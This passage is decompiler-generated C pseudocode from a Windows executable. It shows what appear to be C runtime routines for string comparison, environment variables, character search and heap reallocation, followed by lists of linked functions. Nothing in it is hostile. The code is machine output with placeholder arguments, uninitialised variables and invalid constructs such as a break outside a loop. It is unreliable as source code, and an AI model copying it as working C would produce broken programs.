            *(int32_t *)v11 = v10;
            if (!GetCPInfo((int32_t)&g167, (struct _cpinfo *)&g167)) {
                // 0x40779c
                __writefsdword(0, v1);
                return 0;
            }
            char v15; // bp-58, 0x407531
            if (v8 > 0) {
                // 0x40764d
                v12 = v11;
                if (v14 >= 2 && v15 != 0) {
                    int32_t v16 = &v15; // 0x407670
                    unsigned char v17 = *(char *)(v16 + 1); // 0x40765b
                    v12 = v11;
                    while (v17 != 0) {
                        unsigned char v18 = *(char *)a3; // 0x407665
                        v13 = v11;
                        if (!((v18 > v17 | v18 < *(char *)v16))) {
                            goto lab_0x40761c_2;
                        }
                        // 0x40766f
                        v16 += 2;
                        v12 = v11;
                        if (*(char *)v16 == 0) {
                            // break -> 0x407675
                            break;
                        }
                        v17 = *(char *)(v16 + 1);
                        v12 = v11;
                    }
                }
                goto lab_0x407675;
            } else {
                // 0x407679
                if (v9 > 0) {
                    // 0x40767e
                    if (v14 < 2 || v15 == 0) {
                        // 0x40779c
                        __writefsdword(0, v1);
                        return 1;
                    }
                    int32_t v19 = &v15; // 0x4076a5
                    unsigned char v20 = *(char *)(v19 + 1); // 0x40768c
                    while (v20 != 0) {
                        unsigned char v21 = *(char *)a5; // 0x407696
                        v13 = v11;
                        if (!((v21 > v20 | v21 < *(char *)v19))) {
                            goto lab_0x40761c_2;
                        }
                        // 0x4076a4
                        v19 += 2;
                        if (*(char *)v19 == 0) {
                            // break -> 0x40779c
                            break;
                        }
                        v20 = *(char *)(v19 + 1);
                    }
                    // 0x40779c
                    __writefsdword(0, v1);
                    return 1;
                }
                goto lab_0x4076af;
            }
        }
    }
  lab_0x4076af:
    // 0x4076af
    *(int32_t *)(v11 - 4) = 0;
    *(int32_t *)(v11 - 8) = 0;
    *(int32_t *)(v11 - 12) = v8;
    *(int32_t *)(v11 - 16) = a3;
    *(int32_t *)(v11 - 20) = 9;
    int32_t v22 = v11 - 24; // 0x4076b7
    *(int32_t *)v22 = v10;
    int32_t v23 = MultiByteToWideChar((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x4076ba
    if (v23 == 0) {
        // 0x40779c
        __writefsdword(0, v1);
        return 0;
    }
    // 0x4076cb
    function_401900(v23);
    if (v22 == 0) {
        // 0x40779c
        __writefsdword(0, v1);
        return 0;
    }
    // 0x407707
    *(int32_t *)(v11 - 28) = v23;
    *(int32_t *)(v11 - 32) = v22;
    *(int32_t *)(v11 - 36) = v8;
    *(int32_t *)(v11 - 40) = a3;
    *(int32_t *)(v11 - 44) = 1;
    *(int32_t *)(v11 - 48) = v10;
    int32_t v24 = MultiByteToWideChar((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x40771b
    if (v24 == 0) {
        // 0x40779c
        __writefsdword(0, v1);
        return 0;
    }
    // 0x407721
    *(int32_t *)(v11 - 52) = 0;
    *(int32_t *)(v11 - 56) = 0;
    *(int32_t *)(v11 - 60) = v9;
    *(int32_t *)(v11 - 64) = a5;
    *(int32_t *)(v11 - 68) = 9;
    int32_t v25 = v11 - 72; // 0x40772b
    *(int32_t *)v25 = v10;
    int32_t v26 = MultiByteToWideChar((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x40772e
    if (v26 == 0) {
        // 0x40779c
        __writefsdword(0, v1);
        return 0;
    }
    // 0x407739
    function_401900(v26);
    if (v25 == 0) {
        // 0x40779c
        __writefsdword(0, v1);
        return 0;
    }
    // 0x40776d
    *(int32_t *)(v11 - 76) = v26;
    *(int32_t *)(v11 - 80) = v25;
    *(int32_t *)(v11 - 84) = v9;
    *(int32_t *)(v11 - 88) = a5;
    *(int32_t *)(v11 - 92) = 1;
    *(int32_t *)(v11 - 96) = v10;
    int32_t v27 = MultiByteToWideChar((int32_t)&g167, (int32_t)&g167, (char *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x40777a
    int32_t result2 = 0; // 0x407782
    if (v27 != 0) {
        // 0x407784
        *(int32_t *)(v11 - 100) = v26;
        *(int32_t *)(v11 - 104) = v25;
        *(int32_t *)(v11 - 108) = v23;
        *(int32_t *)(v11 - 112) = v22;
        *(int32_t *)(v11 - 116) = a2;
        *(int32_t *)(v11 - 120) = a1;
        int32_t v28 = CompareStringW((int32_t)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167, (int16_t *)&g167, (int32_t)&g167); // 0x407792
        result2 = v28;
    }
    // 0x40779c
    __writefsdword(0, v1);
    return result2;
  lab_0x407675:
    // 0x407675
    *(int32_t *)(v12 - 4) = 3;
    // 0x40779c
    __writefsdword(0, v1);
    return 3;
}

// Address range: 0x4077ae - 0x407935
int32_t function_4077ae(int32_t a1, int32_t a2) {
    // 0x4077ae
    if (a1 == 0) {
        // 0x407815
        return -1;
    }
    // 0x4077bd
    int32_t v1; // 0x4077ae
    int32_t v2; // 0x4077ae
    int32_t v3; // 0x4077ae
    int32_t v4; // 0x4077ae
    int32_t v5; // 0x4077ae
    int32_t v6 = function_407bf7(a1, 61, v1, v2, v4, v5, v5, v3); // 0x4077c2
    if (v6 == 0 || v6 == a1) {
        // 0x407815
        return -1;
    }
    int32_t v7 = g86; // 0x4077d7
    char v8 = *(char *)(v6 + 1); // 0x4077de
    int32_t v9 = v7; // 0x4077ea
    if (v7 == g87) {
        // 0x4077ec
        v9 = function_40798d(v7);
        g86 = v9;
    }
    // 0x4077f8
    if (v9 == 0) {
        // 0x4077fc
        if (a2 == 0 || g88 == 0) {
            // 0x40781a
            if (v8 == 0) {
                // 0x407815
                return 0;
            }
            int32_t * v10 = _malloc(4); // 0x407824
            g86 = (int32_t)v10;
            if (v10 == NULL) {
                // 0x407815
                return -1;
            }
            // 0x407833
            *v10 = 0;
            if (g88 == 0) {
                int32_t * v11 = _malloc(4); // 0x40783f
                g88 = (int32_t)v11;
                if (v11 == NULL) {
                    // 0x407815
                    return -1;
                }
                // 0x40784e
                *v11 = 0;
            }
        } else {
            // 0x407809
            if (function_4072e3() != 0) {
                // 0x407815
                return -1;
            }
        }
    }
    // 0x407850
    int32_t v12; // bp-24, 0x4077ae
    int32_t v13 = &v12; // 0x4077b5
    int32_t v14 = g86; // 0x407853
    int32_t * v15 = (int32_t *)(v13 - 4); // 0x40785c
    *v15 = v6 - a1;
    int32_t * v16 = (int32_t *)(v13 - 8); // 0x40785d
    *v16 = a1;
    int32_t v17 = function_407935(v14); // 0x407860
    if (v17 < 0) {
        goto lab_0x4078b0;
    } else {
        // 0x40786d
        if (*(int32_t *)v14 == 0) {
            goto lab_0x4078b0;
        } else {
            int32_t v18 = 4 * v17;
            int32_t v19 = v18 + v14;
            int32_t * v20 = (int32_t *)v19;
            if (v8 != 0) {
                // 0x4078a8
                *v20 = a1;
                goto lab_0x4078e2;
            } else {
                // 0x407876
                *v15 = *v20;
                function_402709((int32_t)&g167);
                int32_t v21 = v18; // 0x407885
                if (*v20 != 0) {
                    int32_t v22 = v19 + 4; // 0x407887
                    int32_t * v23 = (int32_t *)v22;
                    int32_t v24 = v17 + 1; // 0x40788a
                    *v20 = *v23;
                    int32_t * v25 = v23; // 0x407885
                    int32_t v26 = v22; // 0x407885
                    int32_t v27 = v24; // 0x407885
                    while (*v23 != 0) {
                        // 0x407887
                        v22 = v26 + 4;
                        v23 = (int32_t *)v22;
                        v24 = v27 + 1;
                        *v25 = *v23;
                        v25 = v23;
                        v26 = v22;
                        v27 = v24;
                    }
                    // 0x407882
                    v21 = 4 * v24;
                }
                // 0x407892
                *v15 = v21;
                *v16 = v14;
                int32_t v28 = function_407abf((int32_t)&g167, (int32_t)&g167); // 0x40789b
                if (v28 == 0) {
                    goto lab_0x4078e2;
                } else {
                    // 0x4078dd
                    g86 = v28;
                    goto lab_0x4078e2;
                }
            }
        }
    }
  lab_0x4078b0:
    // 0x4078b0
    if (v8 == 0) {
        // 0x407815
        return 0;
    }
    int32_t v29 = 4 * (v17 >= 0 ? v17 : -v17); // 0x4078ba
    *v15 = v29 + 8;
    *v16 = v14;
    int32_t v30 = function_407abf((int32_t)&g167, (int32_t)&g167); // 0x4078c3
    if (v30 == 0) {
        // 0x407815
        return -1;
    }
    int32_t v31 = v30 + v29;
    *(int32_t *)v31 = a1;
    *(int32_t *)(v31 + 4) = 0;
    // 0x4078dd
    g86 = v30;
    goto lab_0x4078e2;
  lab_0x4078e2:
    // 0x4078e2
    if (a2 == 0) {
        // 0x407815
        return 0;
    }
    // 0x4078e8
    *v15 = a1;
    *v16 = function_403de0((int32_t)&g167) + 2;
    int32_t * v32 = _malloc((int32_t)&g167); // 0x4078f3
    if (v32 == NULL) {
        // 0x407815
        return 0;
    }
    int32_t v33 = (int32_t)v32; // 0x4078f3
    *v15 = a1;
    *v16 = v33;
    function_405d20((int32_t)&g167);
    int32_t v34 = v33 - a1 + v6; // 0x407910
    *(char *)v34 = 0;
    *v15 = v8 != 0 ? v34 + 1 : 0;
    *v16 = v33;
    SetEnvironmentVariableA((char *)&g167, (char *)&g167);
    *(int32_t *)(v13 - 12) = v33;
    function_402709((int32_t)&g167);
    // 0x407815
    return 0;
}

// Address range: 0x407935 - 0x40798d
int32_t function_407935(int32_t a1) {
    int32_t v1 = *(int32_t *)g86; // 0x40793d
    if (v1 == 0) {
        // 0x40797d
        return 0;
    }
    // 0x407947
    int32_t v2; // bp-8, 0x407935
    int32_t v3 = &v2; // 0x40793c
    *(int32_t *)(v3 - 4) = a1;
    *(int32_t *)(v3 - 8) = v1;
    *(int32_t *)(v3 - 12) = *(int32_t *)(v3 + 12);
    int32_t v4; // 0x407935
    if (__mbsnbicoll() == 0) {
        // 0x407959
        switch (*(char *)(*(int32_t *)v4 + a1)) {
            case 61: {
            }
            case 0: {
                // 0x40797d
                return 0;
            }
        }
    }
    int32_t v5 = g86 + 4; // 0x407966
    int32_t v6 = *(int32_t *)v5; // 0x407966
    while (v6 != 0) {
        // 0x407947
        v4 = v5;
        *(int32_t *)(v3 - 4) = a1;
        *(int32_t *)(v3 - 8) = v6;
        *(int32_t *)(v3 - 12) = *(int32_t *)(v3 + 12);
        if (__mbsnbicoll() == 0) {
            // 0x407959
            switch (*(char *)(*(int32_t *)v4 + a1)) {
                case 61: {
                }
                case 0: {
                    // 0x40797d
                    return (v4 - g86) / 4;
                }
            }
        }
        // 0x407966
        v5 = v4 + 4;
        v6 = *(int32_t *)v5;
    }
    // 0x40797d
    return (v5 - g86) / 0xfffffffc;
}

// Address range: 0x40798d - 0x4079f4
int32_t function_40798d(int32_t a1) {
    if (a1 == 0) {
        // 0x407998
        return 0;
    }
    int32_t * v1 = (int32_t *)a1;
    int32_t v2 = a1; // 0x4079a2
    int32_t v3 = 0; // 0x4079a2
    int32_t v4 = 4; // 0x4079a2
    if (*v1 != 0) {
        v2 += 4;
        v3++;
        while (*(int32_t *)v2 != 0) {
            // 0x4079a4
            v2 += 4;
            v3++;
        }
        // 0x4079ae
        v4 = 4 * v3 + 4;
    }
    int32_t * v5 = _malloc(v4); // 0x4079b9
    if (v5 == NULL) {
        // 0x4079c7
        __amsg_exit();
    }
    int32_t result = (int32_t)v5; // 0x4079b9
    int32_t v6 = *v1;
    if (v6 == 0) {
        // 0x4079ea
        *(int32_t *)result = 0;
        return result;
    }
    int32_t v7 = result; // 0x4079e5
    int32_t v8 = a1; // 0x4079d8
    int32_t v9; // bp-16, 0x40798d
    *(int32_t *)((int32_t)&v9 - 4) = v6;
    v8 += 4;
    *(int32_t *)v7 = function_407c8e((int32_t)&g167);
    v7 += 4;
    int32_t v10 = *(int32_t *)v8;
    while (v10 != 0) {
        // 0x4079d7
        *(int32_t *)((int32_t)&v9 - 4) = v10;
        v8 += 4;
        *(int32_t *)v7 = function_407c8e((int32_t)&g167);
        v7 += 4;
        v10 = *(int32_t *)v8;
    }
    // 0x4079ea
    *(int32_t *)v7 = 0;
    return result;
}

// Address range: 0x4079f4 - 0x407abf
int32_t function_4079f4(int32_t result, int32_t a2, int32_t a3) {
    int32_t v1 = result;
    if (g131 == 0) {
        // 0x407a04
        return result > 90 ? result : result + 32;
    }
    int32_t v2 = g131; // 0x407a2e
    if (result <= 255) {
        // 0x407a30
        int32_t v3; // 0x4079f4
        if (g62 > 1) {
            // 0x407a38
            int32_t v4; // 0x4079f4
            v3 = function_4071fb(result, 1, v4);
        } else {
            // 0x407a43
            v3 = (int32_t)(*(char *)(g35 + 2 * result) & 1);
        }
        // 0x407a4d
        if (v3 == 0) {
            // 0x407aba
            return result;
        }
        // 0x407a4d
        v2 = g131;
    }
    int32_t v5 = result / 256; // 0x407a5d
    char v6 = *(char *)(g35 + (2 * v5 & 510 | 1)); // 0x407a63
    int32_t v7 = v6 > -1 ? 1 : 2;
    v1 = 0x1000000 * (v6 > -1 ? result : v5) / 0x1000000;
    int32_t v8; // bp-8, 0x4079f4
    int32_t v9 = function_406d41(v2, 256, (char *)&v1, v7, &v8, 3, 0, 1, (int32_t)&g167); // 0x407a97
    if (v9 == 0) {
        // 0x407aba
        return result;
    }
    int32_t result2; // 0x4079f4
    if (v9 != 1) {
        // 0x407aad
        unsigned char v10; // 0x4079f4
        result2 = v8 & 255 | 256 * (int32_t)v10;
    } else {
        // 0x407aa7
        result2 = v8 & 255;
    }
    // 0x407aba
    return result2;
}

// Address range: 0x407abf - 0x407bf7
int32_t function_407abf(int32_t a1, int32_t a2) {
    if (a1 == 0) {
        // 0x407bf2
        return (int32_t)_malloc(a2);
    }
    if (a2 == 0) {
        // 0x407ae1
        function_402709(a1);
        // 0x407bf2
        return 0;
    }
    int32_t * v1 = (int32_t *)(a1 - 4);
    int32_t v2; // bp-16, 0x407abf
    int32_t v3 = &v2;
    int32_t v4 = a2;
    int32_t * v5; // 0x407abf
    int32_t v6; // 0x407abf
    int32_t v7; // 0x407abf
    int32_t v8; // 0x407abf
    int32_t v9; // 0x407abf
    int32_t v10; // 0x407abf
    int32_t v11; // 0x407abf
    int32_t v12; // 0x407abf
    int32_t v13; // 0x407abf
    int32_t v14; // 0x407abf
    int32_t v15; // 0x407abf
    int32_t v16; // 0x407abf
    int32_t v17; // 0x407abf
    int32_t * v18; // 0x407afa
    int32_t * v19; // 0x407b01
    int32_t v20; // 0x407b02
    while (true) {
      lab_0x407aef:;
        int32_t v21 = v4;
        v14 = v3;
        v17 = v14;
        v13 = v21;
        v9 = 0;
        if (v21 < 0xffffffe1) {
            // 0x407afa
            v18 = (int32_t *)(v14 - 4);
            *v18 = 9;
            function_403cab((int32_t)&g167);
            v19 = (int32_t *)(v14 - 8);
            *v19 = a1;
            v20 = function_404043((int32_t)&g167);
            if (v20 == 0) {
                // 0x407ba8
                *v18 = 9;
                function_403d0c(0);
                int32_t v22 = v21; // 0x407bb2
                if (v21 == 0) {
                    // 0x407bb4
                    *v18 = 1;
                    v22 = 1;
                }
                int32_t v23 = v22 + 15 & -16; // 0x407bba
                *v18 = v23;
                *v19 = a1;
                *(int32_t *)(v14 - 12) = 0;
                int32_t v24 = v14 - 16; // 0x407bc1
                *(int32_t *)v24 = g152;
                int32_t * v25 = HeapReAlloc(&g167, (int32_t)&g167, &g167, (int32_t)&g167); // 0x407bc7
                v16 = v24;
                v12 = v23;
                v8 = (int32_t)v25;
                goto lab_0x407bcf;
            } else {
                // 0x407b14
                if (v21 > g36) {
                    int32_t v26 = v14 - 12; // 0x407b6e
                    v5 = (int32_t *)v26;
                    v6 = v26;
                    v10 = v21;
                    goto lab_0x407b65;
                } else {
                    // 0x407b1c
                    *v18 = v21;
                    *v19 = a1;
                    int32_t v27 = v14 - 12;
                    int32_t * v28 = (int32_t *)v27;
                    *v28 = v20;
                    int32_t v29 = function_40484e(v20, (int32_t)&g167, (int32_t)&g167); // 0x407b1f
                    v15 = v14;
                    v11 = v21;
                    v7 = a1;
                    if (v29 == 0) {
                        // 0x407b2f
                        *v18 = v21;
                        int32_t v30 = function_404399((int32_t)&g167); // 0x407b30
                        if (v30 == 0) {
                            // 0x407b5e
                            v5 = v28;
                            v6 = v27;
                            v10 = v21;
                            if (v21 == 0) {
                                // 0x407b62
                                *v18 = 1;
                                v5 = v28;
                                v6 = v27;
                                v10 = 1;
                            }
                            goto lab_0x407b65;
                        } else {
                            uint32_t v31 = *v1 - 1; // 0x407b3f
                            *v18 = v31 < v21 ? v31 : v21;
                            *v19 = a1;
                            *v28 = v30;
                            function_406210((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
                            *(int32_t *)(v14 - 16) = a1;
                            *(int32_t *)(v14 - 20) = v20;
                            function_40406e((int32_t)&g167, (int32_t)&g167);
                            v15 = v14;
                            v11 = v21;
                            v7 = v30;
                            goto lab_0x407b9e;
                        }
                    } else {
                        goto lab_0x407b9e;
                    }
                }
            }
        } else {
            goto lab_0x407bd3;
        }
    }
  lab_0x407bf2_3:;
    // 0x407bf2
    int32_t result; // 0x407abf
    return result;
  lab_0x407bd3:
    // 0x407bd3
    result = v9;
    if (g129 == 0) {
        // break -> 0x407bf2
        goto lab_0x407bf2_3;
    }
    // 0x407bdc
    v4 = v13;
    v3 = v17;
    *(int32_t *)(v3 - 4) = v4;
    int32_t v32 = __callnewh((int32_t)&g167); // 0x407bdd
    result = 0;
    if (v32 == 0) {
        // break -> 0x407bf2
        goto lab_0x407bf2_3;
    }
    goto lab_0x407aef;
  lab_0x407bcf:
    // 0x407bcf
    v17 = v16;
    v13 = v12;
    v9 = v8;
    result = v8;
    if (v8 != 0) {
        // break -> 0x407bf2
        goto lab_0x407bf2_3;
    }
    goto lab_0x407bd3;
  lab_0x407b65:;
    int32_t v33 = v6;
    int32_t v34 = v10 + 15 & -16; // 0x407b68
    *v18 = v34;
    *v19 = 0;
    *v5 = g152;
    int32_t * v35 = HeapAlloc(&g167, (int32_t)&g167, (int32_t)&g167); // 0x407b74
    int32_t v36 = (int32_t)v35; // 0x407b74
    v15 = v33;
    v11 = v34;
    v7 = v36;
    if (v35 != NULL) {
        uint32_t v37 = *v1 - 1; // 0x407b83
        *(int32_t *)(v14 - 16) = v37 < v34 ? v37 : v34;
        *(int32_t *)(v14 - 20) = a1;
        *(int32_t *)(v14 - 24) = v36;
        function_406210((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        *(int32_t *)(v14 - 28) = a1;
        *(int32_t *)(v14 - 32) = v20;
        function_40406e((int32_t)&g167, (int32_t)&g167);
        v15 = v33;
        v11 = v34;
        v7 = v36;
    }
    goto lab_0x407b9e;
  lab_0x407b9e:
    // 0x407b9e
    *(int32_t *)(v15 - 4) = 9;
    function_403d0c((int32_t)&g167);
    v16 = v15;
    v12 = v11;
    v8 = v7;
    goto lab_0x407bcf;
}

// Address range: 0x407bf7 - 0x407c8e
int32_t function_407bf7(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x407bf7
    if (g141 == 0) {
        // 0x407c8a
        int32_t v1; // 0x407bf7
        int32_t v2; // 0x407bf7
        int32_t v3; // 0x407bf7
        return function_407cd0(a1, a2, v1, v3, v2);
    }
    // 0x407c14
    function_403cab(25);
    char v4 = *(char *)a1; // 0x407c1f
    int32_t v5 = a1; // 0x407c26
    int32_t v6 = 0; // 0x407c26
    int32_t result; // 0x407bf7
    if (v4 != 0) {
        int32_t v7 = v4;
        int32_t v8; // 0x407bf7
        int32_t v9; // 0x407c34
        unsigned char v10; // 0x407c34
        if ((*(char *)(v7 + (int32_t)&g144) & 4) == 0) {
            // 0x407c4e
            v8 = a1;
            if (v7 == a2) {
                // break -> 0x407c72
                break;
            }
        } else {
            // 0x407c34
            v9 = a1 + 1;
            v10 = *(char *)v9;
            if (v10 == 0) {
                // 0x407c59
                function_403d0c(25);
                result = 0;
                return result;
            }
            // 0x407c3c
            v8 = v9;
            if ((256 * v7 || (int32_t)v10) == a2) {
                // 0x407c65
                function_403d0c(25);
                result = a1;
                return result;
            }
        }
        int32_t v11 = v8 + 1; // 0x407c56
        char v12 = *(char *)v11; // 0x407c1f
        v5 = v11;
        v6 = 0;
        while (v12 != 0) {
            int32_t v13 = v11;
            v7 = v12;
            if ((*(char *)(v7 + (int32_t)&g144) & 4) == 0) {
                // 0x407c4e
                v8 = v13;
                v5 = v13;
                v6 = a2;
                if (v7 == a2) {
                    // break -> 0x407c72
                    break;
                }
            } else {
                // 0x407c34
                v9 = v13 + 1;
                v10 = *(char *)v9;
                if (v10 == 0) {
                    // 0x407c59
                    function_403d0c(25);
                    result = 0;
                    return result;
                }
                // 0x407c3c
                v8 = v9;
                if ((256 * v7 || (int32_t)v10) == a2) {
                    // 0x407c65
                    function_403d0c(25);
                    result = v13;
                    return result;
                }
            }
            // 0x407c56
            v11 = v8 + 1;
            v12 = *(char *)v11;
            v5 = v11;
            v6 = 0;
        }
    }
    // 0x407c72
    function_403d0c(25);
    result = v6 == a2 ? v5 : 0;
  lab_0x407c8a:
    // 0x407c8a
    return result;
}

// Address range: 0x407c8e - 0x407cb9
int32_t function_407c8e(int32_t a1) {
    if (a1 == 0) {
        // 0x407cb5
        return 0;
    }
    int32_t * v1 = _malloc(function_403de0(a1) + 1); // 0x407c9f
    if (v1 == NULL) {
        // 0x407cb5
        return 0;
    }
    // 0x407caa
    return function_405d20((int32_t)v1);
}

// Address range: 0x407cc0 - 0x407cc5
int32_t function_407cc0(int32_t a1) {
    // 0x407cc0
    int32_t v1; // 0x407cc0
    return v1 - 1;
}

// Address range: 0x407cd0 - 0x407d8c
int32_t function_407cd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a2 & 255; // 0x407cd2
    int32_t v2 = 256 * v1; // 0x407cd9
    int32_t v3 = v2; // 0x407ce6
    int32_t v4 = a1; // 0x407ce6
    int32_t result; // 0x407cd0
    if ((a1 & 3) == 0) {
      lab_0x407cfb:;
        int32_t v5 = v3 | v1; // 0x407cfb
        char v6 = v5;
        int32_t v7 = v4; // 0x407d04
        while (true) {
            int32_t v8 = v7;
            uint32_t v9 = *(int32_t *)v8; // 0x407d06
            int32_t v10 = v9 ^ (0x10000 * v5 | v5); // 0x407d11
            if (((v10 ^ -0x7efeff00 ^ v10 + 0x7efefeff) & -0x7efeff00) != 0) {
                char v11 = v9; // 0x407d4b
                result = v8;
                if (v11 == v6) {
                    // break -> 0x407d44
                    break;
                }
                // 0x407d4f
                result = 0;
                if (v11 == 0) {
                    // break -> 0x407d44
                    break;
                }
                char v12 = v9 / 256; // 0x407d53
                if (v12 == v6) {
                    // 0x407d7e
                    return v8 + 1;
                }
                // 0x407d57
                result = 0;
                if (v12 == 0) {
                    // break -> 0x407d44
                    break;
                }
                char v13 = v9 / 0x10000; // 0x407d5e
                if (v13 == v6) {
                    // 0x407d77
                    return v8 + 2;
                }
                // 0x407d62
                result = 0;
                if (v13 == 0) {
                    // break -> 0x407d44
                    break;
                }
                char v14 = v9 / 0x1000000; // 0x407d66
                if (v14 == v6) {
                    // 0x407d70
                    return v8 + 3;
                }
                // 0x407d6a
                result = 0;
                if (v14 == 0) {
                    // break -> 0x407d44
                    break;
                }
            } else {
                int32_t v15 = v9 + 0x7efefeff; // 0x407d13
                int32_t v16 = v9 ^ -0x7efeff00 ^ v15; // 0x407d1f
                if ((v16 & -0x7efeff00) != 0) {
                    // 0x407d33
                    result = 0;
                    if (v15 <= -1 != ((v16 & 0x1010100) == 0)) {
                        // break -> 0x407d44
                        break;
                    }
                }
            }
            // 0x407d06
            v7 = v8 + 4;
        }
    } else {
        int32_t v17 = a1; // 0x407cea
        char v18 = *(char *)v17; // 0x407ce8
        int32_t v19 = v2; // 0x407ced
        if (v18 == (char)a2) {
            v19 = function_407cc0((int32_t)&g167);
        }
        // 0x407cef
        result = 0;
        while (v18 != 0) {
            // 0x407cf3
            v17++;
            v3 = v19;
            v4 = v17;
            if ((v17 & 3) == 0) {
                goto lab_0x407cfb;
            }
            v18 = *(char *)v17;
            if (v18 == (char)a2) {
                v19 = function_407cc0((int32_t)&g167);
            }
            // 0x407cef
            result = 0;
        }
    }
    // 0x407d44
    return result;
}

// Address range: 0x407d8c - 0x407d92
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue) {
    // 0x407d8c
    RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);
}

// Address range: 0x287ea97 - 0x287ea98
int32_t function_287ea97(void) {
    // 0x287ea97
    int32_t result; // 0x287ea97
    return result;
}

// Address range: 0xf9c3b859 - 0xf9c3b85a
int32_t function_f9c3b859(void) {
    // 0xf9c3b859
    int32_t result; // 0xf9c3b859
    return result;
}

// --------------- Statically Linked Functions ----------------

// int32_t __amsg_exit(void);
// int32_t __aulldiv(void);
// int32_t __aullrem(int32_t a1, int32_t a2);
// int32_t __global_unwind2(void);
// int32_t __local_unwind2(void);
// int32_t __mbsnbicoll(void);
// int32_t __NLG_Notify(void);
// void * malloc(size_t size);

// --------------- Dynamically Linked Functions ---------------

// BOOL CloseHandle(_In_ HANDLE hObject);
// int CompareStringA(_In_ LCID Locale, _In_ DWORD dwCmpFlags, PCNZCH lpString1, _In_ int cchCount1, PCNZCH lpString2, _In_ int cchCount2);
// int CompareStringW(_In_ LCID Locale, _In_ DWORD dwCmpFlags, PCNZWCH lpString1, _In_ int cchCount1, PCNZWCH lpString2, _In_ int cchCount2);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FlushFileBuffers(_In_ HANDLE hFile);
// BOOL FreeEnvironmentStringsA(_In_ LPCH penv);
// BOOL FreeEnvironmentStringsW(_In_ LPWCH penv);
// LPSTR GetCommandLineA(VOID);
// BOOL GetCPInfo(_In_ UINT CodePage, _Out_ LPCPINFO lpCPInfo);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentThreadId(VOID);
// LPCH GetEnvironmentStrings(VOID);
// LPWCH GetEnvironmentStringsW(void);
// DWORD GetFileType(_In_ HANDLE hFile);
// DWORD GetLastError(VOID);
// VOID GetLocalTime(_Out_ LPSYSTEMTIME lpSystemTime);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
// HANDLE GetStdHandle(_In_ DWORD nStdHandle);
// BOOL GetStringTypeA(_In_ LCID Locale, _In_ DWORD dwInfoType, LPCSTR lpSrcStr, _In_ int cchSrc, _Out_ LPWORD lpCharType);
// BOOL GetStringTypeW(_In_ DWORD dwInfoType, LPCWCH lpSrcStr, _In_ int cchSrc, _Out_ LPWORD lpCharType);
// VOID GetSystemTime(_Out_ LPSYSTEMTIME lpSystemTime);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetTimeZoneInformation(_Out_ LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// NOT_BUILD_WINDOWS_DEPRECATE DWORD GetVersion(VOID);
// LPVOID HeapAlloc(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ SIZE_T dwBytes);
// HANDLE HeapCreate(_In_ DWORD flOptions, _In_ SIZE_T dwInitialSize, _In_ SIZE_T dwMaximumSize);
// BOOL HeapDestroy(_In_ HANDLE hHeap);
// BOOL HeapFree(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem);
// LPVOID HeapReAlloc(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem, _In_ SIZE_T dwBytes);
// VOID InitializeCriticalSection(_Out_ LPCRITICAL_SECTION lpCriticalSection);
// unsigned InterlockedDecrement(_Inout_ unsigned volatile * Addend);
// unsigned InterlockedIncrement(_Inout_ unsigned volatile * Addend);
// int LCMapStringA(_In_ LCID Locale, _In_ DWORD dwMapFlags, LPCSTR lpSrcStr, _In_ int cchSrc, LPSTR lpDestStr, _In_ int cchDest);
// int LCMapStringW(_In_ LCID Locale, _In_ DWORD dwMapFlags, LPCWSTR lpSrcStr, _In_ int cchSrc, LPWSTR lpDestStr, _In_ int cchDest);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// int MultiByteToWideChar(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCCH lpMultiByteStr, _In_ int cbMultiByte, LPWSTR lpWideCharStr, _In_ int cchWideChar);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// BOOL SetEndOfFile(_In_ HANDLE hFile);
